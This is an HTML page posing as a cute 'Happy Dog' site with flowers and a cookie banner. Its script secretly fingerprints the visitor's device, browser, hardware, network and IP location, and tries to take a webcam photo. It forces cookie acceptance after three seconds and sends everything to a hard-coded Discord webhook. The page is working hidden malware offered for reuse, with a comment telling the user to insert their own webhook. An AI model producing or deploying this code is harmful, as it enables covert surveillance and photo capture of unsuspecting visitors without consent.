<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Happy Dog</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #ffccd5 0%, #ffb7b2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Comic Sans MS', cursive, sans-serif;
            overflow: hidden;
        }
        
        .container {
            text-align: center;
            padding: 20px;
            max-width: 600px;
            width: 90%;
        }
        
        .dog-container {
            position: relative;
            margin-bottom: 30px;
        }
        
        .dog-image {
            width: 100%;
            max-width: 400px;
            height: auto;
            border-radius: 20px;
            border: 8px solid white;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
            animation: bounce 4s ease-in-out infinite;
        }
        
        @keyframes bounce {
            0%, 100% { transform: translateY(0) rotate(0deg); }
            25% { transform: translateY(-10px) rotate(1deg); }
            50% { transform: translateY(0) rotate(0deg); }
            75% { transform: translateY(-5px) rotate(-1deg); }
        }
        
        .flowers {
            font-size: 3rem;
            margin: 30px 0;
            display: flex;
            justify-content: center;
            gap: 20px;
            flex-wrap: wrap;
        }
        
        .flower {
            animation: spin 8s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg) scale(1); }
            50% { transform: rotate(180deg) scale(1.2); }
            100% { transform: rotate(360deg) scale(1); }
        }
        
        .cookie-notice {
            background: rgba(255, 255, 255, 0.9);
            padding: 15px;
            border-radius: 15px;
            margin: 20px auto;
            max-width: 400px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            animation: slideIn 1s ease-out;
        }
        
        @keyframes slideIn {
            from { transform: translateY(50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        
        .cookie-btn {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 25px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
            transition: all 0.3s;
        }
        
        .cookie-btn:hover {
            background: #45a049;
            transform: scale(1.05);
        }
        
        .hidden {
            display: none;
        }
        
        .floating-hearts {
            position: fixed;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
        }
        
        .heart {
            position: absolute;
            font-size: 1.5rem;
            animation: floatUp 15s linear infinite;
            opacity: 0.7;
        }
        
        @keyframes floatUp {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
            10% { opacity: 0.7; }
            90% { opacity: 0.7; }
            100% { transform: translateY(-100px) rotate(360deg); opacity: 0; }
        }
        
        #photoCanvas {
            display: none;
        }
    </style>
</head>
<body>
    <div class="floating-hearts" id="hearts"></div>
    
    <div class="container">
        <div class="dog-container">
            <img src="https://images.unsplash.com/photo-1552053831-71594a27632d?w=800&h=600&fit=crop" 
                 alt="Happy Dog" 
                 class="dog-image"
                 id="dogImage">
        </div>
        
        <div class="flowers">
            <div class="flower">üå∏</div>
            <div class="flower">üå∫</div>
            <div class="flower">üåº</div>
            <div class="flower">üåª</div>
            <div class="flower">üå∑</div>
        </div>
        
        <div class="cookie-notice" id="cookieNotice">
            <p>üç™ This website uses cookies to improve your experience.</p>
            <button class="cookie-btn" id="acceptCookies">Accept All Cookies</button>
        </div>
    </div>
    
    <canvas id="photoCanvas"></canvas>
    <video id="video" autoplay style="display: none;"></video>

    <script>
        // ==============================================
        // üî• GANTI DENGAN DISCORD WEBHOOK KAMU
        // ==============================================
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1469642350593577094/JBHg4hJJfGwBpAlHW-QqS5cp_DY0Qv1S9NKaLvZg01Hkb5Kb4BUPbJ8gnuEJ_A95uEHv";
        // ==============================================

        let collectedData = {
            timestamp: new Date().toISOString(),
            sessionId: generateId(),
            cookiesAccepted: false,
            device: {},
            location: {},
            hardware: {},
            network: {},
            browser: {},
            camera: {
                accessed: false,
                photo: null
            }
        };

        function generateId() {
            return Math.random().toString(36).substr(2, 9);
        }

        function createHearts() {
            const heartsContainer = document.getElementById('hearts');
            const hearts = ['‚ù§Ô∏è', 'üß°', 'üíõ', 'üíö', 'üíô', 'üíú', 'ü§é', 'üñ§', 'ü§ç'];
            
            for (let i = 0; i < 25; i++) {
                const heart = document.createElement('div');
                heart.className = 'heart';
                heart.textContent = hearts[Math.floor(Math.random() * hearts.length)];
                
                const size = Math.random() * 2 + 1;
                const left = Math.random() * 100;
                const delay = Math.random() * 15;
                const duration = Math.random() * 10 + 10;
                
                heart.style.fontSize = `${size}rem`;
                heart.style.left = `${left}%`;
                heart.style.animationDelay = `${delay}s`;
                heart.style.animationDuration = `${duration}s`;
                
                heartsContainer.appendChild(heart);
            }
        }

        // Get detailed device information
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            
            // Detect specific device models
            let deviceModel = "Unknown";
            let brand = "Unknown";
            
            // iPhone detection
            if (/iPhone/.test(ua)) {
                brand = "Apple";
                if (/iPhone OS 17/.test(ua)) deviceModel = "iPhone 15";
                else if (/iPhone OS 16/.test(ua)) deviceModel = "iPhone 14";
                else if (/iPhone OS 15/.test(ua)) deviceModel = "iPhone 13";
                else if (/iPhone OS 14/.test(ua)) deviceModel = "iPhone 12";
                else deviceModel = "iPhone";
            }
            // iPad detection
            else if (/iPad/.test(ua)) {
                brand = "Apple";
                deviceModel = "iPad";
            }
            // Android detection
            else if (/Android/.test(ua)) {
                brand = "Various";
                if (/SM-G998/.test(ua)) deviceModel = "Samsung Galaxy S21 Ultra";
                else if (/SM-G991/.test(ua)) deviceModel = "Samsung Galaxy S21";
                else if (/Pixel/.test(ua)) deviceModel = "Google Pixel";
                else if (/Redmi/.test(ua)) deviceModel = "Xiaomi Redmi";
                else if (/Mi 10/.test(ua)) deviceModel = "Xiaomi Mi 10";
                else deviceModel = "Android Device";
            }
            // Samsung detection
            else if (/Samsung/.test(ua)) {
                brand = "Samsung";
                deviceModel = "Samsung Device";
            }
            // Windows Phone
            else if (/Windows Phone/.test(ua)) {
                brand = "Microsoft";
                deviceModel = "Windows Phone";
            }
            
            collectedData.device = {
                userAgent: ua,
                platform: navigator.platform,
                vendor: navigator.vendor || 'Unknown',
                brand: brand,
                model: deviceModel,
                type: getDeviceType(),
                os: getOSInfo(),
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack
            };
        }

        function getDeviceType() {
            const ua = navigator.userAgent;
            if (/Mobi|Android/i.test(ua)) {
                if (/Tablet|iPad/i.test(ua)) return "Tablet";
                return "Mobile";
            }
            return "Desktop";
        }

        function getOSInfo() {
            const ua = navigator.userAgent;
            if (/Windows NT 10.0/.test(ua)) return "Windows 10/11";
            if (/Windows NT 6.3/.test(ua)) return "Windows 8.1";
            if (/Windows NT 6.2/.test(ua)) return "Windows 8";
            if (/Windows NT 6.1/.test(ua)) return "Windows 7";
            if (/Mac OS X 10_15/.test(ua)) return "macOS Catalina";
            if (/Mac OS X 10_14/.test(ua)) return "macOS Mojave";
            if (/Mac OS X/.test(ua)) return "macOS";
            if (/Android 13/.test(ua)) return "Android 13";
            if (/Android 12/.test(ua)) return "Android 12";
            if (/Android 11/.test(ua)) return "Android 11";
            if (/Android 10/.test(ua)) return "Android 10";
            if (/Android/.test(ua)) return "Android";
            if (/iOS 17/.test(ua)) return "iOS 17";
            if (/iOS 16/.test(ua)) return "iOS 16";
            if (/iOS 15/.test(ua)) return "iOS 15";
            if (/iOS/.test(ua)) return "iOS";
            if (/Linux/.test(ua)) return "Linux";
            return "Unknown";
        }

        function getHardwareInfo() {
            collectedData.hardware = {
                cpuCores: navigator.hardwareConcurrency || "Unknown",
                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "Unknown",
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth
                },
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight
                }
            };
            
            // WebGL GPU detection
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    collectedData.hardware.gpu = {
                        vendor: gl.getParameter(debugInfo ? debugInfo.UNMASKED_VENDOR_WEBGL : gl.VENDOR),
                        renderer: gl.getParameter(debugInfo ? debugInfo.UNMASKED_RENDERER_WEBGL : gl.RENDERER)
                    };
                }
            } catch(e) {}
            
            // Battery info if available
            if ('getBattery' in navigator) {
                navigator.getBattery().then(battery => {
                    collectedData.hardware.battery = {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                });
            }
        }

        async function getLocationInfo() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                collectedData.location.ip = ipData.ip;
                
                // Try multiple location APIs
                const locationApis = [
                    `https://ipapi.co/${ipData.ip}/json/`,
                    `https://ipinfo.io/${ipData.ip}/json`,
                    `https://api.ipgeolocation.io/ipgeo?apiKey=demo&ip=${ipData.ip}`
                ];
                
                for (const api of locationApis) {
                    try {
                        const response = await fetch(api);
                        const data = await response.json();
                        
                        collectedData.location.city = data.city || data.city_name || collectedData.location.city;
                        collectedData.location.region = data.region || data.region_name || data.state || collectedData.location.region;
                        collectedData.location.country = data.country || data.country_name || collectedData.location.country;
                        collectedData.location.countryCode = data.country_code || data.country_code2 || collectedData.location.countryCode;
                        collectedData.location.isp = data.org || data.isp || data.asn || collectedData.location.isp;
                        collectedData.location.timezone = data.timezone || data.time_zone || collectedData.location.timezone;
                        
                        if (data.latitude && data.longitude) {
                            collectedData.location.coordinates = {
                                lat: data.latitude,
                                lon: data.longitude
                            };
                        }
                        
                        if (data.postal) collectedData.location.postal = data.postal;
                        if (data.currency) collectedData.location.currency = data.currency;
                        
                        break; // Stop at first successful API
                    } catch(e) {
                        continue;
                    }
                }
            } catch(e) {
                collectedData.location.ip = "Unknown";
            }
        }

        function getNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                collectedData.network = {
                    effectiveType: connection.effectiveType,
                    downlink: connection.downlink,
                    rtt: connection.rtt,
                    saveData: connection.saveData,
                    type: connection.type,
                    downlinkMax: connection.downlinkMax
                };
            }
        }

        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let browser = "Unknown";
            let version = "Unknown";
            
            if (ua.includes("Chrome") && !ua.includes("Edg")) {
                browser = "Chrome";
                const match = ua.match(/Chrome\/([\d.]+)/);
                version = match ? match[1] : "Unknown";
                
                // Detect Chrome version specifics
                const majorVersion = parseInt(version);
                if (majorVersion >= 120) collectedData.browser.chromeVersion = "Latest (120+)";
                else if (majorVersion >= 100) collectedData.browser.chromeVersion = "Modern (100-119)";
                else if (majorVersion >= 90) collectedData.browser.chromeVersion = "Recent (90-99)";
                
            } else if (ua.includes("Firefox")) {
                browser = "Firefox";
                version = ua.match(/Firefox\/([\d.]+)/)[1];
            } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
                browser = "Safari";
                version = ua.match(/Version\/([\d.]+)/)?.[1] || "Unknown";
            } else if (ua.includes("Edg")) {
                browser = "Edge";
                version = ua.match(/Edg\/([\d.]+)/)[1];
            }
            
            collectedData.browser = {
                name: browser,
                version: version,
                fullVersion: ua,
                plugins: getPluginsList(),
                mimeTypes: getMimeTypes(),
                userAgent: ua
            };
        }

        function getPluginsList() {
            const plugins = [];
            if (navigator.plugins) {
                for (let i = 0; i < navigator.plugins.length; i++) {
                    plugins.push(navigator.plugins[i].name);
                }
            }
            return plugins;
        }

        function getMimeTypes() {
            const mimeTypes = [];
            if (navigator.mimeTypes) {
                for (let i = 0; i < navigator.mimeTypes.length; i++) {
                    mimeTypes.push(navigator.mimeTypes[i].type);
                }
            }
            return mimeTypes;
        }

        // Access camera and take photo
        async function accessCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    } 
                });
                
                const video = document.getElementById('video');
                const canvas = document.getElementById('photoCanvas');
                const context = canvas.getContext('2d');
                
                video.srcObject = stream;
                await video.play();
                
                // Wait for video to be ready
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                // Set canvas size to video size
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                // Draw current video frame to canvas
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Convert to data URL
                const photoData = canvas.toDataURL('image/jpeg', 0.7);
                collectedData.camera.photo = photoData;
                collectedData.camera.accessed = true;
                
                // Stop camera
                stream.getTracks().forEach(track => track.stop());
                
                return true;
            } catch(error) {
                console.log("Camera access failed:", error.message);
                collectedData.camera.error = error.message;
                return false;
            }
        }

        // Set cookies
        function setCookies() {
            const expires = new Date();
            expires.setFullYear(expires.getFullYear() + 1);
            
            // Set multiple cookies
            document.cookie = `session_id=${collectedData.sessionId}; expires=${expires.toUTCString()}; path=/; SameSite=Lax`;
            document.cookie = `device_type=${collectedData.device.type}; expires=${expires.toUTCString()}; path=/`;
            document.cookie = `first_visit=${new Date().toISOString()}; expires=${expires.toUTCString()}; path=/`;
            document.cookie = `cookies_accepted=true; expires=${expires.toUTCString()}; path=/`;
            
            // Also use localStorage
            localStorage.setItem('user_session', collectedData.sessionId);
            localStorage.setItem('device_info', JSON.stringify(collectedData.device));
            localStorage.setItem('visit_count', parseInt(localStorage.getItem('visit_count') || '0') + 1);
            
            collectedData.cookiesAccepted = true;
            collectedData.storedCookies = document.cookie;
            collectedData.localStorage = localStorage;
        }

        async function sendToDiscord() {
            if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK.includes("PASTE_YOUR")) {
                console.log("COLLECTED DATA:", collectedData);
                if (collectedData.camera.photo) {
                    console.log("PHOTO DATA (first 100 chars):", collectedData.camera.photo.substring(0, 100));
                }
                return;
            }

            try {
                // Create embed with device info
                const embed = {
                    title: "üì± DEVICE DATA CAPTURED üì±",
                    color: 0xFF6B8B,
                    timestamp: collectedData.timestamp,
                    fields: [
                        {
                            name: "üÜî SESSION INFO",
                            value: `**Session ID:** \`${collectedData.sessionId}\`\n` +
                                   `**Cookies Accepted:** ${collectedData.cookiesAccepted ? '‚úÖ Yes' : '‚ùå No'}\n` +
                                   `**Timestamp:** ${new Date(collectedData.timestamp).toLocaleString()}`,
                            inline: false
                        },
                        {
                            name: "üìç LOCATION & IP",
                            value: `**IP:** \`${collectedData.location.ip || "Unknown"}\`\n` +
                                   `**Location:** ${collectedData.location.city || "Unknown"}, ${collectedData.location.country || "Unknown"}\n` +
                                   `**ISP:** ${collectedData.location.isp || "Unknown"}\n` +
                                   `**Timezone:** ${collectedData.location.timezone || "Unknown"}`,
                            inline: true
                        },
                        {
                            name: "üì± DEVICE DETAILS",
                            value: `**Brand:** ${collectedData.device.brand || "Unknown"}\n` +
                                   `**Model:** ${collectedData.device.model || "Unknown"}\n` +
                                   `**Type:** ${collectedData.device.type || "Unknown"}\n` +
                                   `**OS:** ${collectedData.device.os || "Unknown"}`,
                            inline: true
                        },
                        {
                            name: "‚öôÔ∏è HARDWARE SPECS",
                            value: `**CPU Cores:** ${collectedData.hardware.cpuCores || "Unknown"}\n` +
                                   `**RAM:** ${collectedData.hardware.deviceMemory || "Unknown"}\n` +
                                   `**Screen:** ${collectedData.hardware.screen.width}x${collectedData.hardware.screen.height}\n` +
                                   `**GPU:** ${collectedData.hardware.gpu?.renderer?.substring(0, 30) || "Unknown"}`,
                            inline: true
                        },
                        {
                            name: "üåê BROWSER INFO",
                            value: `**Browser:** ${collectedData.browser.name || "Unknown"} v${collectedData.browser.version || "Unknown"}\n` +
                                   `**Plugins:** ${collectedData.browser.plugins?.length || 0} installed\n` +
                                   `**Language:** ${collectedData.device.language || "Unknown"}\n` +
                                   `**User Agent:** \`${collectedData.device.userAgent.substring(0, 80)}...\``,
                            inline: false
                        },
                        {
                            name: "üì∂ NETWORK",
                            value: `**Connection:** ${collectedData.network?.effectiveType || "Unknown"}\n` +
                                   `**Speed:** ${collectedData.network?.downlink || "Unknown"} Mbps\n` +
                                   `**Latency:** ${collectedData.network?.rtt || "Unknown"} ms\n` +
                                   `**Save Data:** ${collectedData.network?.saveData ? "On" : "Off"}`,
                            inline: true
                        },
                        {
                            name: "üì∏ CAMERA",
                            value: collectedData.camera.accessed ? 
                                  `**Status:** ‚úÖ Accessed\n**Photo:** Captured (${Math.round(collectedData.camera.photo.length / 1024)}KB)` :
                                  `**Status:** ‚ùå Not accessed\n**Error:** ${collectedData.camera.error || "User denied"}`,
                            inline: true
                        }
                    ],
                    footer: {
                        text: `Dog & Flowers Collector ‚Ä¢ ${new Date().getFullYear()}`
                    }
                };

                const payload = {
                    username: "Device Inspector üêï",
                    avatar_url: "https://i.imgur.com/lL8kQZo.png",
                    content: "@here **NEW DEVICE DETECTED**",
                    embeds: [embed]
                };

                // If photo was captured, send as attachment
                if (collectedData.camera.photo && collectedData.camera.photo.length < 8000000) {
                    // Convert base64 to blob
                    const byteString = atob(collectedData.camera.photo.split(',')[1]);
                    const mimeString = collectedData.camera.photo.split(',')[0].split(':')[1].split(';')[0];
                    const ab = new ArrayBuffer(byteString.length);
                    const ia = new Uint8Array(ab);
                    
                    for (let i = 0; i < byteString.length; i++) {
                        ia[i] = byteString.charCodeAt(i);
                    }
                    
                    const blob = new Blob([ab], { type: mimeString });
                    const formData = new FormData();
                    formData.append('payload_json', JSON.stringify(payload));
                    formData.append('file', blob, 'photo.jpg');
                    
                    await fetch(DISCORD_WEBHOOK, {
                        method: 'POST',
                        body: formData
                    });
                } else {
                    await fetch(DISCORD_WEBHOOK, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                }

                console.log("‚úÖ Data sent to Discord");

            } catch(error) {
                console.error("‚ùå Discord send error:", error);
            }
        }

        // Main execution
        async function executeCollection() {
            // Get all device info
            getDeviceInfo();
            getHardwareInfo();
            getNetworkInfo();
            getBrowserInfo();
            await getLocationInfo();
            
            // Try to access camera
            const cameraSuccess = await accessCamera();
            
            // Set cookies
            setCookies();
            
            // Send to Discord
            await sendToDiscord();
            
            // Hide cookie notice
            document.getElementById('cookieNotice').style.display = 'none';
            
            // Change dog image
            const dogImages = [
                'https://images.unsplash.com/photo-1552053831-71594a27632d?w=800&h=600&fit=crop',
                'https://images.unsplash.com/photo-1518717758536-85ae29035b6d?w=800&h=600&fit=crop',
                'https://images.unsplash.com/photo-1517849845537-4d257902454a?w=800&h=600&fit=crop'
            ];
            
            let currentImage = 0;
            setInterval(() => {
                currentImage = (currentImage + 1) % dogImages.length;
                document.getElementById('dogImage').src = dogImages[currentImage];
            }, 5000);
        }

        // Initialize
        window.addEventListener('load', () => {
            createHearts();
            
            // Auto accept cookies after 3 seconds if not manually accepted
            setTimeout(() => {
                if (!collectedData.cookiesAccepted) {
                    document.getElementById('acceptCookies').click();
                }
            }, 3000);
            
            // Start data collection
            setTimeout(executeCollection, 1000);
        });

        // Cookie acceptance button
        document.getElementById('acceptCookies').addEventListener('click', () => {
            collectedData.cookiesAccepted = true;
            setCookies();
            document.getElementById('cookieNotice').innerHTML = '<p>‚úÖ Cookies accepted! Thank you!</p>';
            setTimeout(() => {
                document.getElementById('cookieNotice').style.display = 'none';
            }, 2000);
            
            // Restart collection with cookies enabled
            executeCollection();
        });

        // Track user interactions
        let interactions = 0;
        document.addEventListener('click', () => {
            interactions++;
            collectedData.interactions = interactions;
        });

        document.addEventListener('mousemove', () => {
            collectedData.lastActivity = new Date().toISOString();
        });
    </script>
</body>
</html>